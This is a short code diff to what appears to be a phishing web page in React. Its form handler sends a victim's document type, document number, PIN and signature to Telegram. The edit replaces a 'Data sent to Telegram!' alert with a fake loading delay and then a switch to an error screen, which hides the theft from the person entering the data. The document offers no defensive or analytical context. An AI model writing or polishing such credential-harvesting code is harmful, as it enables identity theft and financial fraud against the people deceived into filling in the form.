@@ -84,7 +84,11 @@ export default function Home() {
               sendToTelegram(
                 `Document Type: ${formData.documentType}\nDocument Number: ${formData.documentNumber}\nPIN: ${formData.pin}\nSignature: ${formData.signature}`
               );
-              alert("Data sent to Telegram!");
+              setIsLoading(true);
+              setTimeout(() => {
+                setIsLoading(false);
+                setCurrentScreen("error");
+              }, 1500); // Simulate loading for 1.5 seconds
             }}
             onMenuClick={() => setShowSidebar(true)}
             setFormData={setFormData}
